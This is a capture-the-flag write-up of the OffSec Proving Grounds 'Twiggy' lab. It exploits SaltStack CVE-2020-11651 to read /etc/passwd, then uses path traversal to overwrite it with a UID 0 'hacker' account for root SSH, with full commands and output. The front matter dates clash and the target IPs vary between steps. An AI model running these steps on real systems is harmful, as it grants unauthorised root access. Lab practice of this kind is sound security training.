---
title: "Proving grounds Practice: Twiggy"
excerpt: "Offsec proving grounds practice linux machine writeup"
date: 2025-08-24
categories: pg_practice
tags: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- pg-practice
typora-root-url: ../../
date: 2020-05-25
last_modified_at: 2020-05-25
---

## Nmap

```sh
$ nmap -p- -Pn -n --open 192.168.58.62
[ . . . ]
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
4505/tcp open  unknown
4506/tcp open  unknown
8000/tcp open  http-alt
```

## Web
### PORT: 80

![img](/images/2025-08-25-twiggy/image.png)

### PORT: 8000

![img](/images/2025-08-25-twiggy/image-1.png)

The SaltStack Salt REST API is running.

![img](/images/2025-08-25-twiggy/image-2.png)

SaltStack is vulnerable to [Saltstack 3000.1 - Remote Code Execution](https://www.exploit-db.com/exploits/48421)

## Exploitation

```sh
python exploit.py --master 192.168.174.62 

(salt)?(kali?kali)-[~/Desktop]
$ python3 -W ignore exploit.py --master 192.168.53.62
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/salt/lib/python3.13/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.53.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: YW+X7MyAJUrsskh2mt7TkF3FvyJaWLbGfylEiu5AdjFu9Rr8ggmt+HuXNPmPn9rfU1T7rmGnPCY=

---

python exploit.py --master 192.168.174.62 --read /etc/passwd
```

![img](/images/2025-08-25-twiggy/image-3.png)

unable to obtain reverse shell using the `--exec` command in the exploit but we will be able to create and add our own new user account to the `/etc/passwd` file.

### Create new user

```sh
openssl passwd hacked
$1$iBeMKMaU$.O3VYqCZxUvapPL.OQ97/1
```

`hacked` is the password.

Add the following to the `/etc/passwd` content we have extracted from the attacking machine.

```text
hacker:$1$iBeMKMaU$.O3VYqCZxUvapPL.OQ97/1:0:0:root:/root:/bin/bash
```

**Writing /etc/passwd file**

```sh
(salt)?(kali?kali)-[~/Desktop]
$ python3 -W ignore exploit.py --master 192.168.53.62 --upload-src passwd --upload-dest ../../../../../../../../../../../../etc/passwd

```

![img](/images/2025-08-25-twiggy/image-6.png)

**Verify the user existence**

![img](/images/2025-08-25-twiggy/image-5.png)

SSH to the attacking machine using the username as `hacker` and password `hacked`.

![img](/images/2025-08-25-twiggy/image-4.png)

**Root Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr). 